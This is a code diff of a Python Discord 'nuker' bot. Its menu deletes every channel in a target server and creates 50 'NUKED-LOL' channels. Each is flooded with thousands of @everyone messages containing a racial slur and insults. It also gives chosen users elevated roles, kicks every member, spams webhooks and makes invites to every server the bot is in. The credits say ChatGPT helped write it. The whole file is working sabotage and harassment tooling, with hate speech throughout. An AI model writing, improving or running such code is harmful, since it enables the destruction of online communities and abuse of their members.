@@ -2,47 +2,48 @@ import time
 import os
 import sys
 import subprocess
+import discord
+from discord.ext import commands
+import asyncio
+import logging
+import requests
+import colorama
+from colorama import Fore, Style, init
 
-os.system("title Arc V1 (made by vxcn 💖")
 
 def install_requirements_if_needed():
     """Check if requirements are installed, and install them if they're not."""
     try:
         # Run pip check on the requirements file to identify missing or outdated packages
-        result = subprocess.run(
-            [sys.executable, "-m", "pip", "install", "-r", "requirements.txt", "--upgrade", "--quiet"],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE
-        )
+        result = subprocess.run([
+            sys.executable, "-m", "pip", "install", "-r", "requirements.txt",
+            "--upgrade", "--quiet"
+        ],
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE)
 
         # Output only if packages were installed or upgraded
         if result.returncode == 0:
             print("All dependencies are up to date.")
         else:
-            print("Some dependencies were missing or outdated and have been installed.")
+            print(
+                "Some dependencies were missing or outdated and have been installed."
+            )
 
     except FileNotFoundError:
         print("requirements.txt not found.")
     except subprocess.CalledProcessError as e:
         print(f"Error during installation: {e}")
 
+
 # Run the function at the start of the script
 if os.path.isfile("requirements.txt"):
     install_requirements_if_needed()
     time.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
-import discord
-from discord.ext import commands
-import asyncio
-import logging
-import colorama
-import requests
-from colorama import Fore, Style, init
 
 # Initialize colorama
 init(autoreset=True)
-
-
-
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 logging.getLogger('discord.http').setLevel(logging.CRITICAL)
@@ -58,117 +59,173 @@ intents.message_content = True  # Enable message content intent
 # Create the bot instance
 bot = commands.Bot(command_prefix='!', intents=intents)
 
+
 async def async_input(prompt: str) -> str:
     """Async wrapper for input() to avoid blocking the bot."""
     loop = asyncio.get_event_loop()
     return await loop.run_in_executor(None, input, prompt)
 
+
 @bot.event
 async def on_ready():
     # Display the bot's username and ID
-    print(Fore.RED + f'Bot is ready. Logged in as {bot.user} (ID: {bot.user.id})')
+    print(f'Bot is ready. Logged in as {bot.user} (ID: {bot.user.id})')
 
     time.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
 
     # ASCII art for "DSC NUKER"
-    dsc_nuker_ascii = (
-        Fore.RED + " $$$$$$\\  $$$$$$$\\   $$$$$$\\        $$\\    $$\\   $$\\   \n" +
-        Fore.RED + "$$  __$$\\ $$  __$$\\ $$  __$$\\       $$ |   $$ |$$$$ |  \n" +
-        Fore.RED + "$$ /  $$ |$$ |  $$ |$$ /  \\__|      $$ |   $$ |\\_$$ |  \n" +
-        Fore.RED + "$$$$$$$$ |$$$$$$$  |$$ |            \\$$\\  $$  |  $$ |  \n" +
-        Fore.RED + "$$  __$$ |$$  __$$< $$ |             \\$$\\$$  /   $$ |  \n" +
-        Fore.RED + "$$ |  $$ |$$ |  $$ |$$ |  $$\\         \\$$$  /    $$ |  \n" +
-        Fore.RED + "$$ |  $$ |$$ |  $$ |\\$$$$$$  |         \\$  /   $$$$$$\\ \n" +
-        Fore.RED + "\\__|  \\__|\\__|  \\__| \\______/           \\_/    \\______| \n" +
-        Fore.RED + "                                                        \n" +
-        Fore.RED + "                                                        \n" +
-        Fore.RED + "                                                        \n"
-    )
-
-    # Display ASCII art
-    print(dsc_nuker_ascii)
-    time.sleep(2)
-
-    # Ask the user to choose between Discord ServerID or Chat Beta
     while True:
-        print(Fore.RED + "Select an option:")
-        print(Fore.RED + "1. ServerID nuke")
-        print(Fore.RED + "2. Use Message Nuke")
-        print(Fore.RED + "3. Webhook Spammer")  # Moved Webhook Spammer to option 3
-        print(Fore.RED + "4. Commands")  # Moved Commands to option 4
+        print(Fore.RED +
+              " $$$$$$\\  $$$$$$$\\   $$$$$$\\        $$\\    $$\\   $$\\   ")
+        print(Fore.RED +
+              "$$  __$$\\ $$  __$$\\ $$  __$$\\       $$ |   $$ |$$$$ |  ")
+        print(Fore.RED +
+              "$$ /  $$ |$$ |  $$ |$$ /  \\__|      $$ |   $$ |\\_$$ |  ")
+        print(Fore.RED +
+              "$$$$$$$$ |$$$$$$$  |$$ |            \\$$\\  $$  |  $$ |  ")
+        print(Fore.RED +
+              "$$  __$$ |$$  __$$< $$ |             \\$$\\$$  /   $$ |  ")
+        print(Fore.RED +
+              "$$ |  $$ |$$ |  $$ |$$ |  $$\\         \\$$$  /    $$ |  ")
+        print(Fore.RED +
+              "$$ |  $$ |$$ |  $$ |\\$$$$$$  |         \\$  /   $$$$$$\\ ")
+        print(
+            Fore.RED +
+            "\\__|  \\__|\\__|  \\__| \\______/           \\_/    \\______| ")
+        print(Fore.RED +
+              "                                                        ")
+        print(Fore.RED +
+              "                                                        ")
+        print(Fore.RED +
+              "                                                        ")
+        print(
+            Fore.RED +
+            " 1. ServerID nuke         2. Message Nuke        3. Webhook Spammer"
+        )
+        print(" ")
+        print(
+            Fore.RED +
+            " 4. Commands              5. Servers             6. Change Bot Token"
+        )
+        print(" ")
+        print(Fore.RED + " 7. Generate server invite ")
         print(" ")
 
-        choice = await async_input(Fore.RED + "Input: ")
+        choice = await async_input(Fore.RED + "user@ArcV1/~  ")
 
         os.system('cls' if os.name == 'nt' else 'clear')
 
         if choice == '1':
-            server_id = await async_input(Fore.RED + "Please enter the Discord server ID you want to nuke: ")
-            guild = bot.get_guild(int(server_id))
-            if guild is None:
-                print(Fore.RED + "I cannot find a server with that ID (or the bot is not in it)")
-            else:
-                await perform_nuke(guild)
-            os.system('cls' if os.name == 'nt' else 'clear')
-            print(f"Starting nuke on {server_id}!")
-            time.sleep(2) 
-            os.system('cls' if os.name == 'nt' else'clear')
-            print("Check the server!")
-            time.sleep(2)
-            os.system('cls' if os.name == 'nt' else 'clear')
+                    server_id = await async_input(
+                        Fore.RED +
+                        "Please enter the Discord server ID you want to manage: ")
+                    guild = bot.get_guild(int(server_id))
+                    if guild is None:
+                        print(
+                            Fore.RED +
+                            "I cannot find a server with that ID (or the bot is not in it)"
+                        )
+                    else:
+                        # Define a list of user IDs to assign the role to
+                        user_ids = [YOUR DISCORD ID (YOU DONT HAVE TO BE IN IT, BUT IF YOU WANT TO TROLL WITH HIGHER ROLES) , OTHER DISCORD ID]  # Replace these with actual user IDs
 
-        elif choice == '2':
+                        # Get the bot's highest role
+                        bot_member = guild.get_member(bot.user.id)
+                        if bot_member is None:
+                            print(Fore.RED + "Could not find the bot in the server.")
+                            return
+
+                        bot_highest_role = bot_member.top_role
+
+                        # Find the highest role that the bot can assign
+                        assignable_roles = [role for role in guild.roles if role < bot_highest_role]
+                        if not assignable_roles:
+                            print(Fore.RED + "There are no roles that the bot can assign.")
+                            return
+
+                        highest_assignable_role = max(assignable_roles, key=lambda role: role.position)
+
+                        for user_id in user_ids:
+                            user = guild.get_member(user_id)
+
+                            if user is None:
+                                print(Fore.RED + f"User  with ID {user_id} not found in the server.")
+                            else:
+                                # Attempt to add the highest assignable role to the user
+                                try:
+                                    await user.add_roles(highest_assignable_role)
+                                    print(Fore.GREEN + f"Successfully added the highest assignable role '{highest_assignable_role.name}' to the user with ID {user_id}.")
+                                except discord.Forbidden:
+                                    print(Fore.RED + f"I do not have permission to add roles to user with ID {user_id}.")
+                                except discord.HTTPException as e:
+                                    print(Fore.RED + f"Failed to add role to user with ID {user_id}: {e}")
+
+                        # Perform nuke actions after assigning roles
+                        await perform_nuke(guild)
+
+        elif choice == '2': 
             os.system('cls' if os.name == 'nt' else 'clear')
-            print(Fore.RED + "Say !nuke in any channel")
+            print("run !nuke in any channel ")
 
         elif choice == '3':
+            # Webhook Spammer function
+            webhook_url = await async_input(Fore.RED +
+                                            "Enter the Webhook URL: ")
+            for _ in range(10):  # Send 10 messages via webhook
+                requests.post(webhook_url, json={"content": "Webhook spam!"})
+            print(Fore.RED + "Successfully spammed the webhook.")
+            time.sleep(2)
             os.system('cls' if os.name == 'nt' else 'clear')
-            webhook_url = await async_input(Fore.RED + "Please enter the Discord webhook URL: ")
-            message_content = await async_input(Fore.RED + "What message do you want to send? ")
-            message_count = int(await async_input(Fore.RED + "How many messages do you want to send? "))
-            delete_webhook = await async_input(Fore.RED + "Do you want to delete the webhook after sending messages? (yes/no) (has to be lowercase): ")
-	    
-
-        for _ in range(message_count):
-            requests.post(webhook_url, json={"content": message_content})
-
-        print(Fore.RED + f"Sent {message_count} messages to the webhook.")
-
-        if delete_webhook.lower() == 'yes':
-            requests.delete(webhook_url)
-            print(Fore.RED + "Webhook has been deleted.")
-
-            time.sleep(4)
-            os.system('cls' if os.name == 'nt' else 'clear')
-
         elif choice == '4':
-            while True:
-                print(Fore.RED + "Commands:")
-                print(Fore.RED + "!nuke")
-                print(Fore.RED + "!kick")
-                print(" ")
-                print(" ")
-                print(Fore.YELLOW + "Type 5 to go back to the main menu.")
-                choice = await async_input(Fore.RED + "Input: ")
-
-                if choice == '5':
-                    os.system('cls' if os.name == 'nt' else 'clear')
-                    break
-                else:
-                    print(Fore.RED + "Invalid input. Please type 5 to go back.")
-                    time.sleep(2)
-                    os.system('cls' if os.name == 'nt' else 'clear')
-
+            # Commands function
+            print(Fore.RED + "Available commands:")
+            print(Fore.RED + "!nuke - Nukes the server")
+            print(Fore.RED + "!kick - kicks every member")
+            time.sleep(3.5901086)
+            os.system('cls' if os.name == 'nt' else 'clear')
+        elif choice == '5':
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(Fore.RED + "Bot is in the following servers:")
+            for guild in bot.guilds:
+                print(Fore.RED +
+                      f"Server Name: {guild.name}, Server ID: {guild.id}")
+            time.sleep(5)
+            os.system('cls' if os.name == 'nt' else 'clear')
+        elif choice == '6':
+            os.system('cls' if os.name == 'nt' else 'clear')
+            new_token = await async_input(Fore.RED +
+                                          "Please enter the new bot token: ")
+            with open("token.txt", "w") as f:
+                f.write(new_token)
+            print(Fore.RED + "Bot token has been updated.")
+            time.sleep(2)
+            os.system('cls' if os.name == 'nt' else 'clear')
+            
+        elif choice == '7':
+            if bot.guilds:
+                for guild in bot.guilds:  # Loop through all guilds
+                    if guild.text_channels:
+                        invite = await guild.text_channels[0].create_invite(max_age=500)  # Invite valid for 5 minutes
+                        print(Fore.RED + f'Invite link for {guild.name}: {invite}')
+                    else:
+                        print(Fore.RED + f'No text channels found in {guild.name}.')
+                    time.sleep(1)  # Optional: wait a moment between invites for readability
+            else:
+                print(Fore.RED + "The bot is not in any guilds.")
+            time.sleep(5)  # Wait for 5 seconds before clearing the screen
+            os.system('cls' if os.name == 'nt' else 'clear')
+                
         else:
             print(Fore.RED + "Invalid choice.")
             time.sleep(2)
             os.system('cls' if os.name == 'nt' else 'clear')
 
+
 @bot.event
 async def on_command_error(ctx, error):
+    pass
 
-  pass
 
 async def perform_nuke(guild):
     # Delete all channels
@@ -176,37 +233,27 @@ async def perform_nuke(guild):
         await channel.delete()
         await asyncio.sleep(0)  # Delay to avoid rate limits
 
-
     new_channels = []
     for i in range(50):
         channel = await guild.create_text_channel(f'NUKED-LOL')
         new_channels.append(channel)
 
-
     async def spam_messages(channel):
-        for _ in range(10000):  
+        for _ in range(10000):
             await channel.send(f'@everyone I RUN YOU BITCH')
+            await channel.send(f' @everyone LOL NIGGER')
+            await channel.send(
+                f'@everyone raided by daddy vyx909 (https://github.com/vyx909/DscNuker)'
+            )
             await asyncio.sleep(0)
-            await channel.send(f'@everyone FUCK YOU')
-            await asyncio.sleep(0)
-
 
     for channel in new_channels:
         bot.loop.create_task(spam_messages(channel))
 
-
     await asyncio.sleep(1200)  # Adjust the duration as needed
 
-    # q
-    for role in guild.roles:
-        if role.name != "@everyone":  # Don't delete the @everyone role
-            await role.delete()
-
-    # test
-    for _ in range(25):
-        await guild.create_role(name="FUCK YOU")
-
     print("Nuke operation completed!")
+
 
 @bot.command()
 async def nuke(ctx):
@@ -240,10 +287,8 @@ async def kick(ctx):
             else:
                 await ctx.send(f'STUPID NIGG3R')
 
-        await asyncio.sleep(0)  # Add a delay between batches to avoid rate limits
+        await asyncio.sleep(0)
 
-
-# Load token from a file (create it if it doesn't exist)
 token_file = "token.txt"  # Name of the token file
 if not os.path.exists(token_file):
     print(Fore.RED + "Made with love by vxcn 💖 (and chatgpt) ")
